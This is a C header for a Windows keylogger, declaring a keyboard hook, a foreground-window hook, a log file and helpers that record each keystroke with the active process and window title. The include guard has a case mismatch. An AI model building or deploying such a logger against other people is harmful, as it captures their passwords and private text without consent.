#ifndef WINKEY_H
#define WINKEY_h

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Shlwapi.lib")

HHOOK           g_keyboard_hook;                // Handle for the keyboard hook.
HWINEVENTHOOK   g_window_hook;                  // Handle for the window event hook.
FILE*           g_logfile;                      // Pointer to the log file.
HWND            g_last_window;           // Handle to the last recorded window.
HWND            g_foreground_window;     // Handle to the current foreground window.
char            g_process_name[MAX_PATH];  // Name of the process currently in the foreground.
char            g_window_title[256];            // Title of the current foreground window.

// hooks.c
LRESULT CALLBACK handle_key_press(int nCode, WPARAM wParam, LPARAM lParam);
void CALLBACK handle_fg_window_change(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime);

//logger.c
void write_to_log(const char* str);

//utils.c
void remove_brackets(char* str);
const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardState, BOOL isShiftPressed, BOOL isCapsLockOn);
const char* get_special_key_name(DWORD vkCode);

#endif // WINKEY_H